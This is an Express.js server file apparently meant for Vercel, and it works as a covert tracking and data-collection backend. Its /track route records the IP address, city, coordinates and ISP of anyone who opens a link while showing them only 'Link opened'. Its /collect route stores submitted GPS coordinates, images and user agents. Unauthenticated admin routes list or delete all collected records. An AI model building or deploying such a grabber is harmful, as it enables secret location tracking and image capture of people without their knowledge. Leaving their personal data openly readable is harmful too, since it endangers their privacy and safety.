const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();

/* Middleware */
app.use(cors());
app.use(express.json({ limit: "10mb" }));

/* MongoDB (SERVERLESS SAFE) */
let isConnected = false;

async function connectDB() {
  if (isConnected) return;

  try {
    await mongoose.connect(process.env.dbURL);
    isConnected = true;
    console.log("MongoDB connected");
  } catch (err) {
    console.error("MongoDB connection failed:", err);
    throw err;
  }
}

/* Schemas */
const dataSchema = new mongoose.Schema(
  {
    latitude: String,
    longitude: String,
    image: String,
    userAgent: String,
    time: String,
  },
  { timestamps: true }
);

const trackerSchema = new mongoose.Schema(
  {
    ip: String,
    userAgent: String,
    time: String,
    country: String,
    region: String,
    city: String,
    latitude: Number,
    longitude: Number,
    isp: String,
  },
  { timestamps: true }
);

const CollectedData =
  mongoose.models.CollectedData ||
  mongoose.model("CollectedData", dataSchema);

const TrackedData =
  mongoose.models.TrackedData ||
  mongoose.model("TrackedData", trackerSchema);

/* Routes */

app.post("/collect", async (req, res) => {
  await connectDB();
  await CollectedData.create(req.body);
  res.json({ message: "Data stored successfully" });
});

app.get("/admin/data", async (req, res) => {
  await connectDB();
  const allData = await CollectedData.find().sort({ createdAt: -1 });
  res.json(allData);
});

app.delete("/admin/clear", async (req, res) => {
  await connectDB();
  const result = await CollectedData.deleteMany({});
  res.json({ message: `Deleted ${result.deletedCount} records` });
});

app.get("/track", async (req, res) => {
  try {
    await connectDB();

    let ip =
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket.remoteAddress;

    if (ip === "::1" || ip === "127.0.0.1") {
      ip = "8.8.8.8";
    }

    ip = ip.replace("::ffff:", "");

    // Use native fetch (NO node-fetch)
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    const location = await response.json();

    await TrackedData.create({
      ip,
      userAgent: req.headers["user-agent"],
      time: new Date().toLocaleString("en-IN", {
        dateStyle: "medium",
        timeStyle: "short",
      }),
      country: location.country_name,
      city: location.city,
      region: location.region,
      latitude: location.latitude,
      longitude: location.longitude,
      isp: location.org,
    });

    res.send("Link opened");
  } catch (err) {
    console.error(err);
    res.status(500).send("Tracking failed");
  }
});

app.get("/tracked/data", async (req, res) => {
  await connectDB();
  const allData = await TrackedData.find().sort({ createdAt: -1 });
  res.json(allData);
});

/* EXPORT FOR VERCEL */
module.exports = app;
